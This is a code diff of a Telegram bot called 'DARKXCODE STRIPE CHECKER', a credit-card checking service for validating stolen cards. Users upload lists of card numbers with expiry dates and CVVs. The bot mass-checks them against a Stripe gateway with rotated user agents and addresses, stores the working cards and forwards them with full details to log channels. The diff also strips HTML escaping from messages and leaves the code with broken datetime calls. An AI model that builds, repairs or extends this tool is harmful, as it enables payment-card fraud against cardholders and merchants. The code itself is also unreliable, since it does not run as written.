@@ -21,6 +21,7 @@ from telegram.helpers import escape_markdown
 import asyncpg
 import firebase_admin
 from firebase_admin import credentials, firestore
+import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import threading
 import requests
@@ -94,13 +95,14 @@ def init_firebase():
         db = firestore.client()
         print("✅ Firebase connected successfully")
 
-        # Test connection - FIXED
+        # Test connection
         test_ref = db.collection('test').document('connection_test')
         test_ref.set({
             'test': True,
-            'timestamp': firestore.SERVER_TIMESTAMP  # Use Firebase timestamp
+            'timestamp': datetime.datetime.now().isoformat()
         })
         print("✅ Firebase write test successful")
+
         return db, True
     except Exception as e:
         print(f"⚠️  Firebase connection failed: {e}")
@@ -165,18 +167,11 @@ BOT_INFO = {
     "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n• NEW: jogoka.com Gateway"
 }
 
-# In-memory storage as fallback
-in_memory_users = {}
-in_memory_gift_codes = {}
-in_memory_claimed_codes = {}
-in_memory_bot_stats = {
-    "total_checks": 0,
-    "total_approved": 0,
-    "total_declined": 0,
-    "total_credits_used": 0,
-    "total_users": 0,
-    "start_time": datetime.datetime.now().isoformat()  # FIXED
-}
+# In-memory cache for checking tasks (temporary storage)
+checking_tasks = {}
+files_storage = {}  # Add this line
+setup_intent_cache = {}
+last_cache_time = 0
 
 # User-Agent rotation list
 USER_AGENTS = [
@@ -259,46 +254,6 @@ def parseX(data, start, end):
     except (ValueError, TypeError, AttributeError):
         return None
 
-def escape_html(text):
-    """Escape HTML special characters"""
-    if text is None:
-        return ""
-    text = str(text)
-    escape_chars = {
-        '&': '&amp;',
-        '<': '&lt;',
-        '>': '&gt;',
-        '"': '&quot;',
-        "'": '&#39;'
-    }
-    for char, replacement in escape_chars.items():
-        text = text.replace(char, replacement)
-    return text
-
-
-def escape_markdown_v2(text):
-    """Escape markdown v2 special characters for Telegram"""
-    if not text:
-        return text
-    # Escape all markdown special characters
-    escape_chars = '_*[]()~`>#+-=|{}.!'
-    for char in escape_chars:
-        text = text.replace(char, f'\\{char}')
-    return text
-
-
-def safe_card_format(card_data):
-    """Safely format card data for Telegram messages"""
-    try:
-        if "|" in card_data:
-            parts = card_data.split("|")
-            if len(parts) >= 4:
-                # Return as HTML code block
-                return f"<code>{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}</code>"
-        return f"<code>{card_data}</code>"
-    except:
-        return "<code>Invalid card format</code>"
-
 def magneto_check(number: str) -> bool:
     """Validate card number using Luhn algorithm"""
     digits = ''.join(ch for ch in number if ch.isdigit())
@@ -355,7 +310,7 @@ def format_universal_result(card_data,
                             gateway="Stripe Gateway",
                             username=None,
                             time_taken=None):
-    """New exact format as requested - FIXED for HTML"""
+    """New exact format as requested"""
     try:
         # Parse card data
         if isinstance(card_data, str):
@@ -393,20 +348,20 @@ def format_universal_result(card_data,
         if time_taken is None:
             time_taken = random.uniform(1.0, 2.5)
         
-        # Build the exact format with HTML
+        # Build the exact format you requested
         result = f"""
 [↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
 [↯] Status: {status_display}
-[↯] Response: {escape_html(response_msg)}
-[↯] Gateway: {escape_html(gateway)}
+[↯] Response: {response_msg}
+[↯] Gateway: {gateway}
 - - - - - - - - - - - - - - - - - - - - - -
 [↯] Bin Info:-
-[↯] Bank: {escape_html(bin_info['bank'])}
+[↯] Bank: {bin_info['bank']}
 [↯] Country: {bin_info['country']} {bin_info['country_flag']}
 - - - - - - - - - - - - - - - - - - - - - -
 [↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
 - - - - - - - - - - - - - - - - - - - - - -
-[↯] User : @{escape_html(username or 'N/A')}
+[↯] User : @{username or 'N/A'}
 [↯] Made By: @ISHANT_OFFICIAL
 [↯] Bot: @DARKXCODE_STRIPE_BOT
 """
@@ -415,7 +370,7 @@ def format_universal_result(card_data,
 
     except Exception as e:
         logger.error(f"Error in format_universal_result: {e}")
-        return f"[↯] Error: {escape_html(str(e)[:50])}"
+        return f"[↯] Error: {str(e)[:50]}"
 
 
 def random_email():
@@ -2190,38 +2145,27 @@ async def pchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Regular mass check - NO channel forwarding - IMPROVED"""
+    """Regular mass check - NO channel forwarding"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or f"user_{user_id}"
 
-    if not user.get('joined_channel', False):
+    if not user['joined_channel']:
         await update.message.reply_text(
             "❌ Please join our private channel first using /start")
         return
 
     if user_id not in files_storage:
-        # Show upload instructions
-        keyboard = [[
-            InlineKeyboardButton("📁 Upload File", callback_data="upload_help")
-        ]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
         await update.message.reply_text(
-            "📁 <b>No File Found</b>\n"
+            "⚡ *REGULAR MASS CHECK*\n"
             "══════════════════════\n"
-            "Please upload a .txt file with cards first.\n\n"
-            "<b>File Format:</b>\n"
-            "<code>cc|mm|yy|cvv</code>\n"
-            "<code>cc|mm|yy|cvv</code>\n"
-            "(one card per line)\n\n"
-            "<b>Steps:</b>\n"
-            "1. Upload a .txt file\n"
-            "2. Then use <code>/mchk</code>\n\n"
-            "Or click Upload File button below.",
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
+            "1. Upload a .txt file with cards\n"
+            "2. Use `/mchk` to start\n\n"
+            "*Features:*\n"
+            "• Private results (no channel forwarding)\n"
+            "• Files saved to public folder\n"
+            "• Only you see the hits",
+            parse_mode=ParseMode.MARKDOWN)
         return
 
     # Get file info
@@ -2229,27 +2173,22 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cards = file_info["cards"]
     
     # Check if user has enough credits
-    if user.get("credits", 0) < len(cards):
+    if user["credits"] < len(cards):
         await update.message.reply_text(
-            f"💰 <b>INSUFFICIENT CREDITS</b>\n"
+            f"💰 INSUFFICIENT CREDITS\n"
             f"Cards to check: {len(cards)}\n"
             f"Credits needed: {len(cards)}\n"
-            f"Your credits: {user.get('credits', 0)}\n\n"
-            f"You need {len(cards) - user.get('credits', 0)} more credits.",
-            parse_mode=ParseMode.HTML)
+            f"Your credits: {user['credits']}")
         return
 
     # Create status message
     status_msg = await update.message.reply_text(
-        f"⚡ <b>Starting Public Mass Check</b>\n"
-        f"File ID: <code>{file_info['file_id']}</code>\n"
+        f"⚡ Starting Regular Mass Check\n"
+        f"File ID: {file_info['file_id']}\n"
         f"Cards: {len(cards)}\n"
-        f"Credits: {user.get('credits', 0)}\n\n"
-        f"<i>Processing cards...</i>",
-        parse_mode=ParseMode.HTML
-    )
+        f"Results are private...")
 
-    # Start mass check task
+    # Start regular mass check task (use existing mass_check_task_ultrafast with is_private=False)
     task = asyncio.create_task(
         public_mass_check_task(user_id, cards, status_msg, update.message.chat_id, context))
     
@@ -2575,38 +2514,27 @@ FINAL RESULTS:
         del files_storage[user_id]
 
 async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Regular mass check - NO channel forwarding - IMPROVED"""
+    """Private mass check - forwards hits to channels"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or f"user_{user_id}"
 
-    if not user.get('joined_channel', False):
+    if not user['joined_channel']:
         await update.message.reply_text(
             "❌ Please join our private channel first using /start")
         return
 
     if user_id not in files_storage:
-        # Show upload instructions
-        keyboard = [[
-            InlineKeyboardButton("📁 Upload File", callback_data="upload_help")
-        ]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
         await update.message.reply_text(
-            "📁 <b>No File Found</b>\n"
+            "🔒 *PRIVATE MASS CHECK*\n"
             "══════════════════════\n"
-            "Please upload a .txt file with cards first.\n\n"
-            "<b>File Format:</b>\n"
-            "<code>cc|mm|yy|cvv</code>\n"
-            "<code>cc|mm|yy|cvv</code>\n"
-            "(one card per line)\n\n"
-            "<b>Steps:</b>\n"
-            "1. Upload a .txt file\n"
-            "2. Then use <code>/mchk</code>\n\n"
-            "Or click Upload File button below.",
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
+            "1. Upload a .txt file with cards\n"
+            "2. Use `/pmchk` to start\n\n"
+            "*Features:*\n"
+            "• Hits forwarded to private channels\n"
+            "• Files saved to private folder\n"
+            "• All hits logged",
+            parse_mode=ParseMode.MARKDOWN)
         return
 
     # Get file info
@@ -2614,25 +2542,20 @@ async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cards = file_info["cards"]
     
     # Check if user has enough credits
-    if user.get("credits", 0) < len(cards):
+    if user["credits"] < len(cards):
         await update.message.reply_text(
-            f"💰 <b>INSUFFICIENT CREDITS</b>\n"
+            f"💰 INSUFFICIENT CREDITS\n"
             f"Cards to check: {len(cards)}\n"
             f"Credits needed: {len(cards)}\n"
-            f"Your credits: {user.get('credits', 0)}\n\n"
-            f"You need {len(cards) - user.get('credits', 0)} more credits.",
-            parse_mode=ParseMode.HTML)
+            f"Your credits: {user['credits']}")
         return
 
     # Create status message
     status_msg = await update.message.reply_text(
-        f"⚡ <b>Starting Public Mass Check</b>\n"
-        f"File ID: <code>{file_info['file_id']}</code>\n"
+        f"🔒 Starting Private Mass Check\n"
+        f"File ID: {file_info['file_id']}\n"
         f"Cards: {len(cards)}\n"
-        f"Credits: {user.get('credits', 0)}\n\n"
-        f"<i>Processing cards...</i>",
-        parse_mode=ParseMode.HTML
-    )
+        f"Hits will be forwarded to channels...")
 
     # Start private mass check task
     task = asyncio.create_task(
@@ -2643,7 +2566,7 @@ async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "cancelled": False,
         "cards_processed": 0,
         "total_cards": len(cards),
-        "is_private": False,
+        "is_private": True,
         "start_time": time.time(),
         "approved": 0,
         "live": 0,
@@ -3473,9 +3396,8 @@ async def cancel_check_callback(update: Update,
 def log_file_upload(user_id: int, username: str, filename: str, card_count: int):
     """Log file upload activity"""
     try:
-        # FIXED: Use datetime.datetime.now()
         log_entry = {
-            "timestamp": datetime.datetime.now().isoformat(),
+            "timestamp": datetime.now().isoformat(),
             "user_id": user_id,
             "username": username,
             "filename": filename,
@@ -3515,8 +3437,8 @@ def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False
         folder = PRIVATE_HITS_FOLDER if is_private else PUBLIC_HITS_FOLDER
         Path(folder).mkdir(exist_ok=True)
         
-        # FIXED: Use datetime.datetime.now() or time for filename
-        date_str = datetime.datetime.now().strftime("%Y%m%d")
+        # File name format: userid_date_status.txt
+        date_str = datetime.now().strftime("%Y%m%d")
         filename = f"{folder}/{user_id}_{date_str}_{status}.txt"
         
         # Append card to file
@@ -3527,66 +3449,48 @@ def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False
         logger.error(f"Error saving hit card: {e}")
 
 async def send_to_log_channel(context, card: str, status: str, username: str, is_private: bool = False):
-    """Send hit card to appropriate log channel with proper formatting"""
+    """Send hit card to appropriate log channel"""
     if not is_private:
-        return
+        return  # Don't send for public checks
     
     try:
-        # Parse card data
-        parts = card.split("|")
-        if len(parts) < 4:
-            return
-            
-        cc, mon, year, cvv = parts[:4]
+        # Format card for channel
+        cc, mon, year, cvv = card.split("|")
         cc_clean = cc.replace(" ", "")
-        
-        # Get BIN info
         bin_info = get_bin_info(cc_clean[:6])
-        bank_name = bin_info.get('bank', 'Unknown')[:30]  # Truncate long bank names
-        country = bin_info.get('country', 'Unknown')
         
-        # Current time
-        current_time = datetime.datetime.now().strftime('%H:%M:%S')
-        
-        # SAFE FORMATTING: Use HTML to avoid markdown parsing issues
         if status == "approved" and APPROVED_LOG_CHANNEL:
             message = f"""
-[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] Bin Info:-
-[↯] Bank: {escape_html(bin_info['bank'])}
-[↯] Country: {bin_info['country']} {bin_info['country_flag']}
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] User : @{escape_html(username or 'N/A')}
-[↯] Made By: @ISHANT_OFFICIAL
-[↯] Bot: @DARKXCODE_STRIPE_BOT
+✅ APPROVED HIT
+━━━━━━━━━━━━━━━━━━━━
+Card: `{cc}|{mon}|{year}|{cvv}`
+Bank: {bin_info['bank']}
+Country: {bin_info['country']}
+User: @{username}
+Time: {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━
 """
-            
             await context.bot.send_message(
                 chat_id=APPROVED_LOG_CHANNEL,
                 text=message,
-                parse_mode=ParseMode.HTML,
-                disable_web_page_preview=True
+                parse_mode=ParseMode.MARKDOWN
             )
             
         elif status == "live" and LIVE_LOG_CHANNEL:
             message = f"""
-[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] Bin Info:-
-[↯] Bank: {escape_html(bin_info['bank'])}
-[↯] Country: {bin_info['country']} {bin_info['country_flag']}
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] User : @{escape_html(username or 'N/A')}
-[↯] Made By: @ISHANT_OFFICIAL
-[↯] Bot: @DARKXCODE_STRIPE_BOT
+🔥 LIVE HIT
+━━━━━━━━━━━━━━━━━━━━
+Card: `{cc}|{mon}|{year}|{cvv}`
+Bank: {bin_info['bank']}
+Country: {bin_info['country']}
+User: @{username}
+Time: {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━
 """
-            
             await context.bot.send_message(
                 chat_id=LIVE_LOG_CHANNEL,
                 text=message,
-                parse_mode=ParseMode.HTML,
-                disable_web_page_preview=True
+                parse_mode=ParseMode.MARKDOWN
             )
             
     except Exception as e:
@@ -3594,8 +3498,8 @@ async def send_to_log_channel(context, card: str, status: str, username: str, is
 
 async def handle_file_upload_message(update: Update,
                                      context: ContextTypes.DEFAULT_TYPE):
-    """Handle file upload messages for both public and private checks - FIXED"""
-    if not update.message or not update.message.document:
+    """Handle file upload messages for both public and private checks"""
+    if not update.message.document:
         return
 
     user_id = update.effective_user.id
@@ -3608,26 +3512,9 @@ async def handle_file_upload_message(update: Update,
         return
 
     try:
-        # Get file object
-        file_obj = await file.get_file()
-        
-        # Download file to bytes - CORRECT METHOD
-        file_content_bytes = await file_obj.download_as_bytearray()
-        
-        # Decode content
-        try:
-            file_content = file_content_bytes.decode('utf-8', errors='ignore')
-        except UnicodeDecodeError:
-            # Try different encodings
-            for encoding in ['latin-1', 'cp1252', 'iso-8859-1']:
-                try:
-                    file_content = file_content_bytes.decode(encoding, errors='ignore')
-                    break
-                except:
-                    continue
-            else:
-                # Last resort
-                file_content = file_content_bytes.decode('utf-8', errors='replace')
+        # Download file
+        downloaded_file = await file.download_as_bytearray()
+        file_content = downloaded_file.decode('utf-8', errors='ignore')
         
         # Count cards
         cards = [line.strip() for line in file_content.split('\n') if line.strip()]
@@ -3635,21 +3522,15 @@ async def handle_file_upload_message(update: Update,
         
         # Simple format check
         for card in cards:
-            card = card.strip()
             if "|" in card and len(card.split("|")) >= 4:
-                # Basic validation
-                parts = card.split("|")
-                if len(parts[0]) >= 13 and parts[0].replace(" ", "").isdigit():
-                    valid_cards.append(card)
+                valid_cards.append(card)
         
         if len(valid_cards) == 0:
-            await update.message.reply_text(
-                "❌ No valid cards found in file\n"
-                "Format: cc|mm|yy|cvv (one per line)")
+            await update.message.reply_text("❌ No valid cards found in file")
             return
 
         # Generate unique file ID
-        random_chars = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
+        random_chars = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=4))
         file_id = f"{user_id}_{random_chars}"
         
         # Save to received folder
@@ -3664,139 +3545,26 @@ async def handle_file_upload_message(update: Update,
             "username": username,
             "total_cards": len(valid_cards),
             "cards": valid_cards,
-            "timestamp": time.time(),
-            "original_filename": file.file_name
+            "timestamp": time.time()
         }
         
         # Log file upload
         log_file_upload(user_id, username, file.file_name, len(valid_cards))
         
-        # Create response with buttons
-        keyboard = [
-            [
-                InlineKeyboardButton("⚡ Public Check (/mchk)", callback_data="start_public_mass"),
-                InlineKeyboardButton("🔒 Private Check (/pmchk)", callback_data="start_private_mass")
-            ],
-            [
-                InlineKeyboardButton("❌ Cancel", callback_data="cancel_upload")
-            ]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
         await update.message.reply_text(
-            f"✅ <b>File Received</b>\n"
-            f"══════════════════════\n"
-            f"<b>Filename:</b> <code>{file.file_name}</code>\n"
-            f"<b>Valid cards:</b> {len(valid_cards)}\n"
-            f"<b>File ID:</b> <code>{file_id}</code>\n\n"
-            f"<b>Choose check type:</b>\n"
-            f"• <b>⚡ Public Check</b> - Results shown only to you\n"
-            f"• <b>🔒 Private Check</b> - Hits forwarded to channels\n\n"
-            f"<b>Or use commands:</b>\n"
-            f"<code>/mchk</code> - Public mass check\n"
-            f"<code>/pmchk</code> - Private mass check",
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
+            f"✅ File received: `{file.file_name}`\n"
+            f"📊 Valid cards: {len(valid_cards)}\n"
+            f"🔗 File ID: `{file_id}`\n\n"
+            f"Choose check type:\n"
+            f"• `/mchk` - Public check (no channel forwarding)\n"
+            f"• `/pmchk` - Private check (hits forwarded to channels)",
+            parse_mode=ParseMode.MARKDOWN
         )
 
     except Exception as e:
         logger.error(f"Error handling file upload: {e}")
-        await update.message.reply_text(
-            f"❌ Error processing file: {str(e)[:100]}",
-            parse_mode=ParseMode.HTML
-        )
+        await update.message.reply_text(f"❌ Error processing file: {str(e)[:50]}")
 
-async def start_public_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start public mass check from callback"""
-    query = update.callback_query
-    
-    try:
-        await query.answer()
-    except BadRequest:
-        pass
-    
-    user_id = query.from_user.id
-    
-    # Call the mchk_command function
-    await query.edit_message_text("Starting public mass check...")
-    
-    # Create a fake message to pass to mchk_command
-    fake_update = Update(
-        update_id=update.update_id,
-        message=query.message,
-        callback_query=query
-    )
-    
-    # Clear any args to trigger the normal flow
-    context.args = []
-    
-    await mchk_command(fake_update, context)
-
-async def start_private_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start private mass check from callback"""
-    query = update.callback_query
-    
-    try:
-        await query.answer()
-    except BadRequest:
-        pass
-    
-    user_id = query.from_user.id
-    
-    # Call the pmchk_command function
-    await query.edit_message_text("Starting private mass check...")
-    
-    # Create a fake message
-    fake_update = Update(
-        update_id=update.update_id,
-        message=query.message,
-        callback_query=query
-    )
-    
-    # Clear any args
-    context.args = []
-    
-    await pmchk_command(fake_update, context)
-
-async def cancel_upload_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancel file upload"""
-    query = update.callback_query
-    
-    try:
-        await query.answer("Upload cancelled")
-    except BadRequest:
-        pass
-    
-    user_id = query.from_user.id
-    
-    # Remove stored file
-    if user_id in files_storage:
-        file_info = files_storage[user_id]
-        try:
-            if os.path.exists(file_info["received_file"]):
-                os.remove(file_info["received_file"])
-        except:
-            pass
-        del files_storage[user_id]
-    
-    await query.edit_message_text(
-        "❌ <b>File Upload Cancelled</b>\n"
-        "The uploaded file has been removed.\n"
-        "You can upload a new file anytime.",
-        parse_mode=ParseMode.HTML
-    )
-
-async def download_telegram_file(file_id: str, bot) -> bytes:
-    """Download file from Telegram using correct API"""
-    try:
-        # Get file path
-        file = await bot.get_file(file_id)
-        # Download to bytes
-        file_bytes = await file.download_as_bytearray()
-        return file_bytes
-    except Exception as e:
-        logger.error(f"Error downloading file {file_id}: {e}")
-        raise
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle errors gracefully"""
@@ -3829,19 +3597,20 @@ async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 class HealthHandler(BaseHTTPRequestHandler):
+
     def do_GET(self):
         if self.path == '/':
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            html = f"""
+            html = """
             <!DOCTYPE html>
             <html>
             <head>
                 <title>⚡ DARKXCODE STRIPE CHECKER ⚡</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1">
                 <style>
-                    body {{
+                    body {
                         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                         color: white;
@@ -3853,8 +3622,8 @@ class HealthHandler(BaseHTTPRequestHandler):
                         flex-direction: column;
                         justify-content: center;
                         align-items: center;
-                    }}
-                    .container {{
+                    }
+                    .container {
                         background: rgba(0, 0, 0, 0.7);
                         padding: 40px;
                         border-radius: 20px;
@@ -3862,29 +3631,47 @@ class HealthHandler(BaseHTTPRequestHandler):
                         max-width: 800px;
                         width: 90%;
                         backdrop-filter: blur(10px);
-                    }}
-                    h1 {{
+                    }
+                    h1 {
                         font-size: 2.5em;
                         margin-bottom: 20px;
                         color: #00ff88;
                         text-shadow: 0 0 10px #00ff88;
-                    }}
-                    .status {{
+                    }
+                    .status {
                         font-size: 1.5em;
                         margin: 20px 0;
                         padding: 15px;
                         background: rgba(0, 255, 136, 0.1);
                         border-radius: 10px;
                         border: 2px solid #00ff88;
-                    }}
-                    .info-box {{
+                    }
+                    .info-box {
                         background: rgba(255, 255, 255, 0.1);
                         padding: 20px;
                         border-radius: 10px;
                         margin: 15px 0;
                         text-align: left;
-                    }}
-                    .telegram-btn {{
+                    }
+                    .stats {
+                        display: grid;
+                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                        gap: 15px;
+                        margin: 20px 0;
+                    }
+                    .stat-box {
+                        background: rgba(255, 255, 255, 0.1);
+                        padding: 15px;
+                        border-radius: 10px;
+                    }
+                    .glow {
+                        animation: glow 2s ease-in-out infinite alternate;
+                    }
+                    @keyframes glow {
+                        from { text-shadow: 0 0 5px #fff, 0 0 10px #00ff88; }
+                        to { text-shadow: 0 0 10px #fff, 0 0 20px #00ff88, 0 0 30px #00ff88; }
+                    }
+                    .telegram-btn {
                         display: inline-block;
                         background: #0088cc;
                         color: white;
@@ -3894,27 +3681,82 @@ class HealthHandler(BaseHTTPRequestHandler):
                         font-weight: bold;
                         margin-top: 20px;
                         transition: all 0.3s;
-                    }}
-                    .telegram-btn:hover {{
+                    }
+                    .telegram-btn:hover {
                         background: #006699;
                         transform: scale(1.05);
-                    }}
+                    }
+                    footer {
+                        margin-top: 30px;
+                        color: rgba(255, 255, 255, 0.7);
+                        font-size: 0.9em;
+                    }
                 </style>
             </head>
             <body>
                 <div class="container">
-                    <h1>⚡ DARKXCODE STRIPE CHECKER ⚡</h1>
+                    <h1 class="glow">⚡ DARKXCODE STRIPE CHECKER ⚡</h1>
+                    
                     <div class="status">✅ BOT IS ONLINE & RUNNING</div>
+                    
                     <div class="info-box">
-                        <h3>🤖 Bot Status</h3>
-                        <p><strong>Version:</strong> v2.0</p>
-                        <p><strong>Port:</strong> {port}</p>
-                        <p><strong>Status:</strong> Active</p>
+                        <h3>🤖 Bot Information</h3>
+                        <p><strong>Version:</strong> v4.0</p>
+                        <p><strong>Status:</strong> Active 24/7</p>
+                        <p><strong>Features:</strong> Ultra-fast card checking with real-time results</p>
                     </div>
+                    
+                    <div class="stats">
+                        <div class="stat-box">
+                            <h4>⚡ Speed</h4>
+                            <p>5 cards/second</p>
+                        </div>
+                        <div class="stat-box">
+                            <h4>📍 Rotation</h4>
+                            <p>US, UK, CA, IN, AU</p>
+                        </div>
+                        <div class="stat-box">
+                            <h4>🤝 Referral</h4>
+                            <p>100 credits each</p>
+                        </div>
+                        <div class="stat-box">
+                            <h4>🛡️ Security</h4>
+                            <p>Encrypted & Secure</p>
+                        </div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h3>🚀 Bot Features</h3>
+                        <ul style="text-align: left;">
+                            <li>• Ultra-Fast Single Card Check</li>
+                            <li>• Mass Check with Live Results</li>
+                            <li>• Gift Code System</li>
+                            <li>• Advanced Admin Panel</li>
+                            <li>• Real-time Statistics</li>
+                            <li>• Invite & Earn System</li>
+                        </ul>
+                    </div>
+                    
                     <a href="https://t.me/DarkXCode" class="telegram-btn" target="_blank">
                         📲 Contact on Telegram
                     </a>
+                    
+                    <footer>
+                        <p>© 2024 DARKXCODE STRIPE CHECKER | Version 4.0</p>
+                        <p>Service Status: <span style="color: #00ff88;">●</span> Operational</p>
+                    </footer>
                 </div>
+                
+                <script>
+                    // Update time every second
+                    function updateTime() {
+                        const now = new Date();
+                        document.getElementById('current-time').textContent = 
+                            now.toLocaleTimeString() + ' ' + now.toLocaleDateString();
+                    }
+                    setInterval(updateTime, 1000);
+                    updateTime();
+                </script>
             </body>
             </html>
             """
@@ -3923,51 +3765,34 @@ class HealthHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            response = {{
+            response = {
                 "status": "online",
                 "service": "darkxcode-stripe-checker",
-                "version": "2.0",
+                "version": "4.0",
                 "timestamp": datetime.datetime.now().isoformat()
-            }}
+            }
             self.wfile.write(json.dumps(response).encode())
         else:
             self.send_response(404)
             self.end_headers()
-    
+
     def log_message(self, format, *args):
+        # Disable logging for health checks
         pass
 
 
-def start_health_server():
-    """Start health server on first available port"""
-    port = int(os.environ.get('PORT', 8080))
-    max_attempts = 5
-    
-    for attempt in range(max_attempts):
-        current_port = port + attempt
-        try:
-            server = HTTPServer(('0.0.0.0', current_port), HealthHandler)
-            print(f"🌐 Health server started on port {current_port}")
-            print(f"🔗 Web interface: http://localhost:{current_port}")
-            print(f"🔗 Health check: http://localhost:{current_port}/health")
-            server.serve_forever()
-            break
-        except OSError as e:
-            if "Address already in use" in str(e) and attempt < max_attempts - 1:
-                print(f"⚠️  Port {current_port} in use, trying {current_port + 1}")
-                continue
-            else:
-                print(f"⚠️  Could not start health server: {e}")
-                break
+def start_health_server(port=8080):
+    """Start a simple HTTP server for health checks"""
+    server = HTTPServer(('0.0.0.0', port), HealthHandler)
+    print(f"🌐 Health server started on port {port}")
+    print(f"🔗 Web interface: http://localhost:{port}")
+    print(f"🔗 Health check: http://localhost:{port}/health")
+    server.serve_forever()
 
 
 async def main():
     """Start the bot"""
     print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
-    
-    # Skip health server if port is busy
-    print("⚠️  Health server port busy, continuing without web interface")
-    print("⚠️  Bot functionality remains unaffected")
 
     if not firebase_connected:
         print("⚠️  Using in-memory storage instead")
@@ -3975,14 +3800,14 @@ async def main():
     else:
         print("✅ Firebase connected successfully")
 
-    # Start health server in a separate thread with retry logic
-    health_thread = threading.Thread(target=start_health_server, daemon=True)
+    # Start health server in a separate thread
+    health_port = int(os.environ.get('PORT', 8080))
+    health_thread = threading.Thread(target=start_health_server,
+                                     args=(health_port, ),
+                                     daemon=True)
     health_thread.start()
-    
-    # Give health server a moment to start
-    await asyncio.sleep(1)
 
-    # Create application
+    # Create application with Pydroid-compatible settings
     application = Application.builder().token(BOT_TOKEN).build()
 
     # Add error handler
@@ -4040,15 +3865,6 @@ async def main():
         CallbackQueryHandler(cancel_check_callback, pattern="^cancel_check_"))
     application.add_handler(
         CallbackQueryHandler(cancel_mass_callback, pattern="^cancel_mass$"))
-    application.add_handler(
-        CallbackQueryHandler(start_public_mass_callback, pattern="^start_public_mass$"))
-    application.add_handler(
-        CallbackQueryHandler(start_private_mass_callback, pattern="^start_private_mass$"))
-    application.add_handler(
-        CallbackQueryHandler(cancel_upload_callback, pattern="^cancel_upload$"))
-    application.add_handler(
-        CallbackQueryHandler(lambda u, c: u.callback_query.answer("Upload a .txt file"), 
-                        pattern="^upload_help$"))
 
     # Admin panel callbacks
     application.add_handler(
@@ -4067,23 +3883,30 @@ async def main():
                              pattern="^admin_botinfo$"))
 
     # ========== UNKNOWN COMMAND HANDLER ==========
+    # Must be added LAST to catch all other commands
     application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
 
-    # Start bot
+    # Start bot with Pydroid-compatible settings
     print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
     print(f"🤝 Invite & Earn: 100 credits per referral")
-    print(f"📊 Database: {'✅ Connected' if firebase_connected else '⚠️ In-memory'}")
+    print(f"📊 Database: ✅ Connected")
     print(f"🔐 Admin Commands: {len(ADMIN_IDS)} admin(s)")
     print("✅ Bot is running...")
 
-    # Start polling
+    # Start polling with Pydroid-compatible settings
     await application.initialize()
     await application.start()
-    await application.updater.start_polling()
 
-    # Keep the bot running
-    while True:
-        await asyncio.sleep(3600)
+    try:
+        await application.updater.start_polling()
+        # Keep the bot running
+        while True:
+            await asyncio.sleep(3600)  # Sleep for 1 hour
+    except asyncio.CancelledError:
+        pass
+    finally:
+        await application.stop()
+        await application.shutdown()
 
 
 def start_bot():
